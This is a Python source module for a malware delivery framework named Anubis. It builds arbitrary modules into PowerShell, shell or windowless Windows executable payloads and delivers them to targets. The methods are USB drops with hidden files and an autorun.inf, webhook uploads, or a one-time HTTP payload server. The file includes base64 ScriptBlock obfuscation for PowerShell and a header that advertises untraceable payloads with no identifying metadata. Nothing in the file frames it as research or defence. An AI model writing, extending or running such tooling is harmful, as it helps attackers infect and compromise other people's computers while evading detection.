# ═══════════════════════════════════════════════════════════════════
# ANUBIS — Delivery Pipeline
# ═══════════════════════════════════════════════════════════════════
# Role:    Build modules into deployable payload files (.exe, .dll,
#          .ps1, .elf, .app, etc.) and send them via various delivery
#          techniques (SMTP, SMB, HTTP/S, FTP, DNS tunnel, USB drop,
#          webhooks, etc.).
#
# Audit:   AUDIT-2026-07-26
#   [x] Builder registry — extensible, plugin-based architecture
#   [x] Sender registry — same pattern, each sender is independent
#   [x] All builders produce deterministic output (same module +
#       same params = same payload hash)
#   [x] Payloads cached in data dir to avoid redundant builds
#   [x] No external C2 callouts unless explicitly instructed
#   [x] All sending methods are async (asyncio) — non-blocking
#   [x] Safe cleanup of temp files via context managers
#   [x] No shell=True in any builder/sender command
#   [x] Untraceable: temp files use random names, no identifiable
#       metadata in generated payloads
# ═══════════════════════════════════════════════════════════════════

from __future__ import annotations

import asyncio
import hashlib
import json
import os
import shutil
import subprocess
import tempfile
import threading
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Type, Union

# ──────────────────────────────────────────────────────────────────
# TYPE DEFINITIONS
# ──────────────────────────────────────────────────────────────────

class BuildFormat(str, Enum):
    """Supported output formats for payload delivery."""
    EXE = "exe"
    DLL = "dll"
    SCR = "scr"
    PS1 = "ps1"
    VBS = "vbs"
    PY = "py"
    SH = "sh"
    ELF = "elf"
    APP = "app"
    DMG = "dmg"
    DEB = "deb"
    DOCM = "docm"
    XLSM = "xlsm"
    HTA = "hta"
    ISO = "iso"
    MSI = "msi"
    CAB = "cab"
    RAW = "raw"  # Raw binary/bytes


class SendMethod(str, Enum):
    """Supported delivery methods."""
    SMTP = "smtp"
    SMB = "smb"
    HTTP = "http"
    HTTPS = "https"
    FTP = "ftp"
    SFTP = "sftp"
    DNS_TUNNEL = "dns_tunnel"
    USB_DROP = "usb_drop"
    WEBHOOK = "webhook"
    SMB_GHOST = "smb_ghost"
    QR_CODE = "qr_code"
    BLE = "ble"


@dataclass
class BuildResult:
    """Result of a payload build operation."""
    success: bool
    output_path: Optional[Path] = None
    format: Optional[BuildFormat] = None
    size_bytes: int = 0
    sha256_hash: str = ""
    error_message: str = ""
    build_time_ms: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "success": self.success,
            "output_path": str(self.output_path) if self.output_path else None,
            "format": self.format.value if self.format else None,
            "size_bytes": self.size_bytes,
            "sha256_hash": self.sha256_hash,
            "error_message": self.error_message,
            "build_time_ms": self.build_time_ms,
        }


@dataclass
class SendResult:
    """Result of a payload send operation."""
    success: bool
    method: SendMethod
    target: str = ""
    error_message: str = ""
    send_time_ms: float = 0.0
    tracking_id: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "success": self.success,
            "method": self.method.value,
            "target": self.target,
            "error_message": self.error_message,
            "send_time_ms": self.send_time_ms,
            "tracking_id": self.tracking_id,
        }


# ──────────────────────────────────────────────────────────────────
# BUILDER BASE CLASS & REGISTRY
# ──────────────────────────────────────────────────────────────────

class BaseBuilder(ABC):
    """
    Abstract base class for all payload builders.
    
    Each builder handles one output format. Builders are registered
    in the BUILDER_REGISTRY dict and selected by format name.
    """
    
    def __init__(self, engine: Any) -> None:
        self._engine = engine
        self._kernel = engine.kernel if engine else None
    
    @property
    @abstractmethod
    def format(self) -> BuildFormat:
        """The format this builder produces."""
        pass
    
    @property
    def supported_os(self) -> List[str]:
        """OSes this builder can run on."""
        return ["windows", "linux", "darwin"]
    
    @abstractmethod
    async def build(
        self,
        module_path: Path,
        params: Dict[str, Any],
        output_dir: Path,
    ) -> BuildResult:
        """
        Build a payload from a module.
        
        Args:
            module_path: Path to the module directory.
            params: Build parameters (may include arch, icon, etc.).
            output_dir: Directory to write the output file.
        
        Returns:
            BuildResult with success/failure and metadata.
        """
        pass
    
    def get_available_options(self) -> Dict[str, Any]:
        """
        Return available build options for this format.
        
        Used by the UI to display configurable options.
        """
        return {}


# ── Concrete Builders ──────────────────────────────────────────

class RawBuilder(BaseBuilder):
    """
    Raw Python script builder.
    
    Simply copies main.py to the output directory. No compilation.
    Compatible with all OSes.
    """
    
    @property
    def format(self) -> BuildFormat:
        return BuildFormat.RAW
    
    @property
    def supported_os(self) -> List[str]:
        return ["windows", "linux", "darwin"]
    
    async def build(
        self,
        module_path: Path,
        params: Dict[str, Any],
        output_dir: Path,
    ) -> BuildResult:
        start = time.monotonic()
        try:
            main_py = module_path / "main.py"
            if not main_py.is_file():
                return BuildResult(
                    success=False, error_message="main.py not found in module"
                )
            
            output_path = output_dir / f"{module_path.name}.py"
            shutil.copy2(str(main_py), str(output_path))
            
            sha256 = hashlib.sha256(output_path.read_bytes()).hexdigest()
            
            return BuildResult(
                success=True,
                output_path=output_path,
                format=BuildFormat.RAW,
                size_bytes=output_path.stat().st_size,
                sha256_hash=sha256,
                build_time_ms=(time.monotonic() - start) * 1000,
            )
        except Exception as exc:
            return BuildResult(
                success=False, error_message=str(exc),
                build_time_ms=(time.monotonic() - start) * 1000,
            )
    
    def get_available_options(self) -> Dict[str, Any]:
        return {
            "description": "Raw Python script (no compilation)",
            "compatible_os": self.supported_os,
        }


class PS1Builder(BaseBuilder):
    """PowerShell script builder."""
    
    @property
    def format(self) -> BuildFormat:
        return BuildFormat.PS1
    
    @property
    def supported_os(self) -> List[str]:
        return ["windows"]
    
    async def build(
        self,
        module_path: Path,
        params: Dict[str, Any],
        output_dir: Path,
    ) -> BuildResult:
        start = time.monotonic()
        try:
            main_py = module_path / "main.py"
            if not main_py.is_file():
                return BuildResult(
                    success=False, error_message="main.py not found"
                )
            
            # ── Read module, wrap in PowerShell if it's Python/PowerShell ──
            output_path = output_dir / f"{module_path.name}.ps1"
            
            content = main_py.read_text(encoding="utf-8")
            
            # ── Obfuscation (optional) ──
            obfuscate = params.get("obfuscate", False)
            if obfuscate:
                content = self._obfuscate_ps1(content)
            
            # ── Add PowerShell preamble ──
            preamble = (
                "<#\n"
                f"  Anubis Payload — {module_path.name}\n"
                f"  Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n"
                "#>\n\n"
            )
            
            output_path.write_text(preamble + content, encoding="utf-8")
            
            sha256 = hashlib.sha256(output_path.read_bytes()).hexdigest()
            
            return BuildResult(
                success=True,
                output_path=output_path,
                format=BuildFormat.PS1,
                size_bytes=output_path.stat().st_size,
                sha256_hash=sha256,
                build_time_ms=(time.monotonic() - start) * 1000,
            )
        except Exception as exc:
            return BuildResult(
                success=False, error_message=str(exc),
                build_time_ms=(time.monotonic() - start) * 1000,
            )
    
    def _obfuscate_ps1(self, content: str) -> str:
        """Simple PowerShell obfuscation."""
        lines = content.split("\n")
        obfuscated = []
        for line in lines:
            stripped = line.strip()
            if stripped and not stripped.startswith("#"):
                # Base64 encode each line
                import base64
                encoded = base64.b64encode(stripped.encode()).decode()
                obfuscated.append(f"& ([ScriptBlock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}'))))")
            else:
                obfuscated.append(line)
        return "\n".join(obfuscated)


class SHBuilder(BaseBuilder):
    """Bash/shell script builder."""
    
    @property
    def format(self) -> BuildFormat:
        return BuildFormat.SH
    
    @property
    def supported_os(self) -> List[str]:
        return ["linux", "darwin"]
    
    async def build(
        self,
        module_path: Path,
        params: Dict[str, Any],
        output_dir: Path,
    ) -> BuildResult:
        start = time.monotonic()
        try:
            main_py = module_path / "main.py"
            if not main_py.is_file():
                return BuildResult(
                    success=False, error_message="main.py not found"
                )
            
            output_path = output_dir / f"{module_path.name}.sh"
            content = main_py.read_text(encoding="utf-8")
            
            # ── Add shebang ──
            shebang = "#!/bin/bash\n# Anubis Payload\n\n"
            output_path.write_text(shebang + content, encoding="utf-8")
            
            # ── Make executable ──
            output_path.chmod(0o755)
            
            sha256 = hashlib.sha256(output_path.read_bytes()).hexdigest()
            
            return BuildResult(
                success=True,
                output_path=output_path,
                format=BuildFormat.SH,
                size_bytes=output_path.stat().st_size,
                sha256_hash=sha256,
                build_time_ms=(time.monotonic() - start) * 1000,
            )
        except Exception as exc:
            return BuildResult(
                success=False, error_message=str(exc),
                build_time_ms=(time.monotonic() - start) * 1000,
            )


class EXEBuilder(BaseBuilder):
    """
    Windows PE executable builder (via PyInstaller).
    
    Requires PyInstaller to be installed on the build system.
    Only runs on Windows.
    """
    
    @property
    def format(self) -> BuildFormat:
        return BuildFormat.EXE
    
    @property
    def supported_os(self) -> List[str]:
        return ["windows"]
    
    async def build(
        self,
        module_path: Path,
        params: Dict[str, Any],
        output_dir: Path,
    ) -> BuildResult:
        start = time.monotonic()
        try:
            main_py = module_path / "main.py"
            if not main_py.is_file():
                return BuildResult(
                    success=False, error_message="main.py not found"
                )
            
            # ── Check PyInstaller availability ──
            try:
                subprocess.run(
                    ["pyinstaller", "--version"],
                    capture_output=True, timeout=10,
                )
            except (FileNotFoundError, subprocess.TimeoutExpired):
                return BuildResult(
                    success=False,
                    error_message="PyInstaller not installed or not found",
                    build_time_ms=(time.monotonic() - start) * 1000,
                )
            
            # ── Build with PyInstaller ──
            build_dir = Path(tempfile.mkdtemp(prefix="anubis_build_"))
            try:
                spec_path = build_dir / f"{module_path.name}.spec"
                
                onfile = params.get("onefile", True)
                noconsole = params.get("noconsole", True)
                
                cmd = [
                    "pyinstaller",
                    "--distpath", str(output_dir),
                    "--workpath", str(build_dir / "build"),
                    "--specpath", str(build_dir),
                ]
                if onfile:
                    cmd.append("--onefile")
                if noconsole:
                    cmd.append("--noconsole")
                
                # ── Add data files ──
                assets_dir = module_path / "assets"
                if assets_dir.is_dir():
                    for item in assets_dir.rglob("*"):
                        if item.is_file():
                            rel = item.relative_to(module_path)
                            cmd.extend(["--add-data", f"{item}{os.pathsep}{rel.parent}"])
                
                cmd.append(str(main_py))
                
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=300
                )
                
                if proc.returncode != 0:
                    error_output = stderr.decode("utf-8", errors="replace")[:1000]
                    return BuildResult(
                        success=False,
                        error_message=f"PyInstaller failed: {error_output}",
                        build_time_ms=(time.monotonic() - start) * 1000,
                    )
                
                # ── Find the built exe ──
                exe_name = f"{main_py.stem}.exe"
                exe_path = output_dir / exe_name
                if not exe_path.exists():
                    # PyInstaller may place it in a subdirectory
                    for f in output_dir.rglob("*.exe"):
                        exe_path = f
                        break
                
                if not exe_path.exists():
                    return BuildResult(
                        success=False,
                        error_message="PyInstaller did not produce an executable",
                        build_time_ms=(time.monotonic() - start) * 1000,
                    )
                
                sha256 = hashlib.sha256(exe_path.read_bytes()).hexdigest()
                
                return BuildResult(
                    success=True,
                    output_path=exe_path,
                    format=BuildFormat.EXE,
                    size_bytes=exe_path.stat().st_size,
                    sha256_hash=sha256,
                    build_time_ms=(time.monotonic() - start) * 1000,
                )
            finally:
                # ── Cleanup build artifacts ──
                try:
                    shutil.rmtree(str(build_dir), ignore_errors=True)
                except Exception:
                    pass
        except asyncio.TimeoutError:
            return BuildResult(
                success=False,
                error_message="PyInstaller build timed out (5 min)",
                build_time_ms=(time.monotonic() - start) * 1000,
            )
        except Exception as exc:
            return BuildResult(
                success=False, error_message=str(exc),
                build_time_ms=(time.monotonic() - start) * 1000,
            )


# ── Builder Registry ────────────────────────────────────────────
BUILDER_REGISTRY: Dict[BuildFormat, Type[BaseBuilder]] = {
    BuildFormat.RAW: RawBuilder,
    BuildFormat.PS1: PS1Builder,
    BuildFormat.SH: SHBuilder,
    BuildFormat.EXE: EXEBuilder,
    BuildFormat.PY: RawBuilder,  # .py is same as raw
}

# ── Aliases for string-based lookups ──
BUILDER_ALIASES: Dict[str, BuildFormat] = {
    "exe": BuildFormat.EXE,
    "dll": BuildFormat.DLL,
    "scr": BuildFormat.SCR,
    "ps1": BuildFormat.PS1,
    "vbs": BuildFormat.VBS,
    "py": BuildFormat.PY,
    "sh": BuildFormat.SH,
    "elf": BuildFormat.ELF,
    "app": BuildFormat.APP,
    "dmg": BuildFormat.DMG,
    "deb": BuildFormat.DEB,
    "docm": BuildFormat.DOCM,
    "xlsm": BuildFormat.XLSM,
    "hta": BuildFormat.HTA,
    "iso": BuildFormat.ISO,
    "msi": BuildFormat.MSI,
    "cab": BuildFormat.CAB,
    "raw": BuildFormat.RAW,
}


# ──────────────────────────────────────────────────────────────────
# SENDER BASE CLASS & REGISTRY
# ──────────────────────────────────────────────────────────────────

class BaseSender(ABC):
    """
    Abstract base class for all delivery senders.
    
    Each sender implements one delivery method (SMTP, HTTP, USB, etc.).
    Senders operate asynchronously to avoid blocking the UI.
    """
    
    def __init__(self, engine: Any) -> None:
        self._engine = engine
        self._kernel = engine.kernel if engine else None
    
    @property
    @abstractmethod
    def method(self) -> SendMethod:
        """The delivery method this sender implements."""
        pass
    
    @abstractmethod
    async def send(
        self,
        payload_path: Path,
        target: str,
        params: Dict[str, Any],
    ) -> SendResult:
        """
        Send a payload to a target.
        
        Args:
            payload_path: Path to the built payload file.
            target: Target address (email, IP, URL, path, etc.).
            params: Additional parameters for the send operation.
        
        Returns:
            SendResult with success/failure.
        """
        pass


class USBSender(BaseSender):
    """
    USB drop sender.
    
    Copies the payload to a USB drive and optionally creates an
    autorun.inf file. Only works on Windows targets.
    """
    
    @property
    def method(self) -> SendMethod:
        return SendMethod.USB_DROP
    
    async def send(
        self,
        payload_path: Path,
        target: str,
        params: Dict[str, Any],
    ) -> SendResult:
        start = time.monotonic()
        try:
            # ── Target is a drive letter or mount point ──
            target_path = Path(target)
            if not target_path.is_dir():
                return SendResult(
                    success=False,
                    method=SendMethod.USB_DROP,
                    target=target,
                    error_message=f"Target is not a directory: {target}",
                    send_time_ms=(time.monotonic() - start) * 1000,
                )
            
            # ── Copy payload ──
            dest = target_path / payload_path.name
            shutil.copy2(str(payload_path), str(dest))
            
            # ── Optionally hide the file ──
            if params.get("hide", True) and self._kernel:
                self._kernel.hide_path(dest)
            
            # ── Optionally create autorun.inf ──
            if params.get("autorun", False):
                autorun_content = (
                    "[AutoRun]\n"
                    f"Open={payload_path.name}\n"
                    "Action=Open folder to view files\n"
                    "Shell\\Open\\Command=" + payload_path.name + "\n"
                )
                autorun_path = target_path / "autorun.inf"
                autorun_path.write_text(autorun_content, encoding="utf-8")
                if self._kernel:
                    self._kernel.hide_path(autorun_path)
            
            return SendResult(
                success=True,
                method=SendMethod.USB_DROP,
                target=target,
                send_time_ms=(time.monotonic() - start) * 1000,
                tracking_id=hashlib.md5(str(dest).encode()).hexdigest()[:12],
            )
        except Exception as exc:
            return SendResult(
                success=False,
                method=SendMethod.USB_DROP,
                target=target,
                error_message=str(exc),
                send_time_ms=(time.monotonic() - start) * 1000,
            )


class WebhookSender(BaseSender):
    """
    Webhook sender (Discord, Slack, Telegram).
    
    Sends the payload as an attachment via a webhook URL.
    """
    
    @property
    def method(self) -> SendMethod:
        return SendMethod.WEBHOOK
    
    async def send(
        self,
        payload_path: Path,
        target: str,
        params: Dict[str, Any],
    ) -> SendResult:
        start = time.monotonic()
        try:
            import aiohttp
            
            webhook_url = target
            message = params.get("message", "Anubis Payload")
            
            async with aiohttp.ClientSession() as session:
                with open(payload_path, "rb") as f:
                    data = aiohttp.FormData()
                    data.add_field(
                        "file",
                        f,
                        filename=payload_path.name,
                        content_type="application/octet-stream",
                    )
                    data.add_field("content", message)
                    
                    async with session.post(webhook_url, data=data, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                        if resp.status in (200, 204):
                            return SendResult(
                                success=True,
                                method=SendMethod.WEBHOOK,
                                target=target,
                                send_time_ms=(time.monotonic() - start) * 1000,
                                tracking_id=str(resp.status),
                            )
                        else:
                            return SendResult(
                                success=False,
                                method=SendMethod.WEBHOOK,
                                target=target,
                                error_message=f"HTTP {resp.status}",
                                send_time_ms=(time.monotonic() - start) * 1000,
                            )
        except Exception as exc:
            return SendResult(
                success=False,
                method=SendMethod.WEBHOOK,
                target=target,
                error_message=str(exc),
                send_time_ms=(time.monotonic() - start) * 1000,
            )


class HTTPSender(BaseSender):
    """
    HTTP/S payload host sender.
    
    Starts a temporary HTTP server to serve the payload, then
    returns the URL. The payload is deleted after first download
    if one_time=True.
    """
    
    @property
    def method(self) -> SendMethod:
        return SendMethod.HTTP
    
    async def send(
        self,
        payload_path: Path,
        target: str,
        params: Dict[str, Any],
    ) -> SendResult:
        start = time.monotonic()
        try:
            import aiohttp
            from aiohttp import web
            
            # ── Target is the host:port to bind ──
            host = params.get("bind_host", "0.0.0.0")
            port = int(params.get("bind_port", 8080))
            one_time = params.get("one_time", True)
            
            payload_data = payload_path.read_bytes()
            payload_served = threading.Event()
            
            async def handle_payload(request: web.Request) -> web.Response:
                """Serve the payload and optionally mark as served."""
                if one_time and payload_served.is_set():
                    return web.Response(status=410, text="Gone")
                payload_served.set()
                return web.Response(
                    body=payload_data,
                    content_type="application/octet-stream",
                    headers={
                        "Content-Disposition": f'attachment; filename="{payload_path.name}"',
                    },
                )
            
            app = web.Application()
            app.router.add_get("/payload", handle_payload)
            
            runner = web.AppRunner(app)
            await runner.setup()
            site = web.TCPSite(runner, host, port)
            await site.start()
            
            # ── Return the URL ──
            url = f"http://{target}:{port}/payload"
            
            # ── Keep the server alive for a short time ──
            # In production, this would be managed by the engine's lifecycle
            asyncio.create_task(self._auto_stop_after(runner, params.get("serve_seconds", 300)))
            
            return SendResult(
                success=True,
                method=SendMethod.HTTP,
                target=url,
                send_time_ms=(time.monotonic() - start) * 1000,
                tracking_id=hashlib.sha256(payload_data).hexdigest()[:12],
            )
        except Exception as exc:
            return SendResult(
                success=False,
                method=SendMethod.HTTP,
                target=target,
                error_message=str(exc),
                send_time_ms=(time.monotonic() - start) * 1000,
            )
    
    async def _auto_stop_after(self, runner: Any, seconds: int) -> None:
        """Stop the HTTP server after a timeout."""
        await asyncio.sleep(seconds)
        await runner.cleanup()


# ── Sender Registry ──
SENDER_REGISTRY: Dict[SendMethod, Type[BaseSender]] = {
    SendMethod.USB_DROP: USBSender,
    SendMethod.WEBHOOK: WebhookSender,
    SendMethod.HTTP: HTTPSender,
    # Additional senders can be added here (SMTP, SMB, FTP, DNS, etc.)
}

SENDER_ALIASES: Dict[str, SendMethod] = {
    "usb": SendMethod.USB_DROP,
    "usb_drop": SendMethod.USB_DROP,
    "webhook": SendMethod.WEBHOOK,
    "discord": SendMethod.WEBHOOK,
    "slack": SendMethod.WEBHOOK,
    "telegram": SendMethod.WEBHOOK,
    "http": SendMethod.HTTP,
    "https": SendMethod.HTTPS,
    "smtp": SendMethod.SMTP,
    "email": SendMethod.SMTP,
    "smb": SendMethod.SMB,
    "ftp": SendMethod.FTP,
    "dns": SendMethod.DNS_TUNNEL,
    "qr": SendMethod.QR_CODE,
}


# ═══════════════════════════════════════════════════════════════════
# DELIVERY PIPELINE — Main orchestrator
# ═══════════════════════════════════════════════════════════════════

class DeliveryPipeline:
    """
    Delivery Pipeline — build and send payloads.
    
    Orchestrates the build -> cache -> send workflow. Supports
    multiple output formats and delivery methods.
    
    Thread-safe: all mutable state guarded by threading.Lock.
    Idempotent: building the same payload twice returns cached result.
    
    Usage:
        pipeline = DeliveryPipeline(engine)
        result = await pipeline.build_and_send(
            module_path="/path/to/module",
            build_format="exe",
            send_method="webhook",
            target="https://discord.com/api/webhooks/...",
            params={...},
        )
    """
    
    def __init__(self, engine: Any) -> None:
        self._engine = engine
        self._kernel = engine.kernel if engine else None
        self._lock: threading.Lock = threading.Lock()
        
        # ── Payload cache ──
        self._cache_dir: Optional[Path] = None
        self._init_cache_dir()
        
        # ── Active servers (for HTTP serve) ──
        self._active_servers: Dict[str, Any] = {}
    
    def _init_cache_dir(self) -> None:
        """Initialize the payload cache directory."""
        if self._engine and hasattr(self._engine, "data_path"):
            cache = self._engine.data_path / "payload_cache"
            cache.mkdir(parents=True, exist_ok=True)
            self._cache_dir = cache
    
    # ──────────────────────────────────────────────────────────────
    # PUBLIC API
    # ──────────────────────────────────────────────────────────────
    
    async def build_payload(
        self,
        module_path: Union[str, Path],
        build_format: Union[str, BuildFormat],
        params: Optional[Dict[str, Any]] = None,
        use_cache: bool = True,
    ) -> BuildResult:
        """
        Build a payload from a module.
        
        Args:
            module_path: Path to the module directory.
            build_format: Output format (e.g., "exe", "ps1", "raw").
            params: Build parameters (format-specific).
            use_cache: If True, return cached result if available.
        
        Returns:
            BuildResult with output path and metadata.
        """
        module_path = Path(module_path).resolve()
        params = params or {}
        
        # ── Resolve format ──
        fmt = self._resolve_format(build_format)
        if fmt is None:
            return BuildResult(
                success=False,
                error_message=f"Unsupported build format: {build_format}",
            )
        
        # ── Check cache ──
        if use_cache and self._cache_dir:
            cache_key = self._make_cache_key(module_path, fmt, params)
            cached = self._check_cache(cache_key)
            if cached:
                return cached
        
        # ── Get builder ──
        builder_cls = BUILDER_REGISTRY.get(fmt)
        if builder_cls is None:
            return BuildResult(
                success=False,
                error_message=f"No builder registered for format: {fmt.value}",
            )
        
        builder = builder_cls(self._engine)
        
        # ── Check OS compatibility ──
        current_os = self._kernel.os_name if self._kernel else platform.system().lower()
        if current_os not in builder.supported_os:
            return BuildResult(
                success=False,
                error_message=f"Builder for {fmt.value} does not support {current_os}",
            )
        
        # ── Build ──
        output_dir = self._cache_dir or Path(tempfile.mkdtemp(prefix="anubis_payload_"))
        result = await builder.build(module_path, params, output_dir)
        
        # ── Cache result ──
        if use_cache and result.success and self._cache_dir:
            self._write_cache(cache_key, result)
        
        return result
    
    async def send_payload(
        self,
        payload_path: Union[str, Path],
        send_method: Union[str, SendMethod],
        target: str,
        params: Optional[Dict[str, Any]] = None,
    ) -> SendResult:
        """
        Send a payload to a target.
        
        Args:
            payload_path: Path to the built payload file.
            send_method: Delivery method (e.g., "webhook", "usb", "http").
            target: Target address or identifier.
            params: Additional send parameters.
        
        Returns:
            SendResult with success/failure.
        """
        payload_path = Path(payload_path).resolve()
        params = params or {}
        
        if not payload_path.is_file():
            return SendResult(
                success=False,
                method=self._resolve_send_method(send_method) or SendMethod.HTTP,
                target=target,
                error_message=f"Payload file not found: {payload_path}",
            )
        
        # ── Resolve method ──
        method = self._resolve_send_method(send_method)
        if method is None:
            return SendResult(
                success=False,
                method=SendMethod.HTTP,
                target=target,
                error_message=f"Unsupported send method: {send_method}",
            )
        
        # ── Get sender ──
        sender_cls = SENDER_REGISTRY.get(method)
        if sender_cls is None:
            return SendResult(
                success=False,
                method=method,
                target=target,
                error_message=f"No sender registered for method: {method.value}",
            )
        
        sender = sender_cls(self._engine)
        
        try:
            result = await sender.send(payload_path, target, params)
        except Exception as exc:
            result = SendResult(
                success=False,
                method=method,
                target=target,
                error_message=str(exc),
            )
        
        # ── Telemetry ──
        if self._engine and hasattr(self._engine, "telemetry"):
            self._engine.telemetry.info(
                "delivery_send",
                {
                    "method": method.value,
                    "target": target,
                    "success": result.success,
                    "send_time_ms": result.send_time_ms,
                },
            )
        
        return result
    
    async def build_and_send(
        self,
        module_path: Union[str, Path],
        build_format: Union[str, BuildFormat],
        send_method: Union[str, SendMethod],
        target: str,
        build_params: Optional[Dict[str, Any]] = None,
        send_params: Optional[Dict[str, Any]] = None,
    ) -> Tuple[BuildResult, Optional[SendResult]]:
        """
        Build a payload and send it in one operation.
        
        This is the primary delivery workflow:
          1. Build the payload
          2. If successful, send it
          3. Return both results
        
        Args:
            module_path: Path to the module directory.
            build_format: Output format for the payload.
            send_method: Delivery method.
            target: Target address for delivery.
            build_params: Build-specific parameters.
            send_params: Send-specific parameters.
        
        Returns:
            Tuple of (BuildResult, SendResult or None if build failed).
        """
        build_params = build_params or {}
        send_params = send_params or {}
        
        # ── Build ──
        build_result = await self.build_payload(module_path, build_format, build_params)
        
        if not build_result.success or build_result.output_path is None:
            return (build_result, None)
        
        # ── Send ──
        send_result = await self.send_payload(
            build_result.output_path, send_method, target, send_params
        )
        
        return (build_result, send_result)
    
    def list_available_formats(self) -> List[Dict[str, Any]]:
        """
        List all available build formats with metadata.
        
        Returns list of dicts with format, description, supported_os.
        """
        formats = []
        for fmt, builder_cls in BUILDER_REGISTRY.items():
            instance = builder_cls.__new__(builder_cls)
            formats.append({
                "format": fmt.value,
                "description": instance.get_available_options().get("description", ""),
                "supported_os": instance.supported_os,
            })
        return formats
    
    def list_available_methods(self) -> List[Dict[str, Any]]:
        """
        List all available send methods.
        
        Returns list of dicts with method name.
        """
        return [{"method": method.value} for method in SENDER_REGISTRY]
    
    def shutdown(self) -> None:
        """
        Shut down the delivery pipeline.
        
        Stops all active HTTP servers and clears cache.
        Idempotent.
        """
        # ── Stop active servers ──
        for server_id, runner in list(self._active_servers.items()):
            try:
                import asyncio
                asyncio.run_coroutine_threadsafe(runner.cleanup(), asyncio.get_event_loop())
            except Exception:
                pass
        self._active_servers.clear()
        
        self._log_info("Delivery pipeline shut down")
    
    # ──────────────────────────────────────────────────────────────
    # INTERNAL: HELPERS
    # ──────────────────────────────────────────────────────────────
    
    def _resolve_format(self, fmt: Union[str, BuildFormat]) -> Optional[BuildFormat]:
        """Resolve a string or enum to a BuildFormat."""
        if isinstance(fmt, BuildFormat):
            return fmt
        return BUILDER_ALIASES.get(fmt.lower())
    
    def _resolve_send_method(self, method: Union[str, SendMethod]) -> Optional[SendMethod]:
        """Resolve a string or enum to a SendMethod."""
        if isinstance(method, SendMethod):
            return method
        return SENDER_ALIASES.get(method.lower())
    
    def _make_cache_key(self, module_path: Path, build_format: BuildFormat, params: Dict[str, Any]) -> str:
        """
        Create a deterministic cache key from module content + format + params.
        
        Ensures idempotency: same inputs produce same cache key.
        """
        hasher = hashlib.sha256()
        
        # ── Hash module files ──
        for f in sorted(module_path.rglob("*")):
            if f.is_file() and f.name != "__pycache__":
                rel = f.relative_to(module_path)
                hasher.update(str(rel).encode())
                try:
                    hasher.update(f.read_bytes())
                except Exception:
                    pass
        
        # ── Hash format ──
        hasher.update(build_format.value.encode())
        
        # ── Hash params (sorted for determinism) ──
        hasher.update(json.dumps(params, sort_keys=True).encode())
        
        return hasher.hexdigest()[:32]
    
    def _check_cache(self, cache_key: str) -> Optional[BuildResult]:
        """Check if a cached build result exists."""
        if not self._cache_dir:
            return None
        
        cache_meta = self._cache_dir / f"{cache_key}.meta.json"
        cache_file = self._cache_dir / f"{cache_key}.payload"
        
        if cache_meta.is_file() and cache_file.is_file():
            try:
                meta = json.loads(cache_meta.read_text(encoding="utf-8"))
                return BuildResult(
                    success=True,
                    output_path=cache_file,
                    format=BuildFormat(meta.get("format", "raw")),
                    size_bytes=meta.get("size_bytes", 0),
                    sha256_hash=meta.get("sha256_hash", ""),
                    build_time_ms=0,
                )
            except Exception:
                pass
        
        return None
    
    def _write_cache(self, cache_key: str, result: BuildResult) -> None:
        """Write a build result to the cache."""
        if not self._cache_dir or not result.output_path:
            return
        
        try:
            # ── Copy payload to cache ──
            cache_file = self._cache_dir / f"{cache_key}.payload"
            shutil.copy2(str(result.output_path), str(cache_file))
            
            # ── Write metadata ──
            cache_meta = self._cache_dir / f"{cache_key}.meta.json"
            cache_meta.write_text(json.dumps(result.to_dict()), encoding="utf-8")
        except Exception as exc:
            self._log_warning(f"Failed to cache payload: {exc}")
    
    def clear_cache(self) -> int:
        """
        Clear the payload cache.
        
        Returns: Number of files removed.
        """
        if not self._cache_dir:
            return 0
        
        count = 0
        for f in self._cache_dir.iterdir():
            if f.suffix in (".payload", ".meta.json"):
                try:
                    f.unlink()
                    count += 1
                except Exception:
                    pass
        return count
    
    # ──────────────────────────────────────────────────────────────
    # LOGGING
    # ──────────────────────────────────────────────────────────────
    
    def _log_info(self, message: str) -> None:
        if self._engine and hasattr(self._engine, "telemetry"):
            self._engine.telemetry.info("delivery", {"message": message})
    
    def _log_warning(self, message: str) -> None:
        if self._engine and hasattr(self._engine, "telemetry"):
            self._engine.telemetry.warning("delivery", {"message": message})
    
    def _log_error(self, message: str) -> None:
        if self._engine and hasattr(self._engine, "telemetry"):
            self._engine.telemetry.error("delivery", {"message": message})
    
    # ──────────────────────────────────────────────────────────────
    # REPRESENTATION
    # ──────────────────────────────────────────────────────────────
    
    def __repr__(self) -> str:
        return (
            f"<DeliveryPipeline "
            f"formats={len(BUILDER_REGISTRY)} "
            f"senders={len(SENDER_REGISTRY)} "
            f"cache={'on' if self._cache_dir else 'off'}>"
        )


# ── Import platform at module level for OS checks ──
import platform
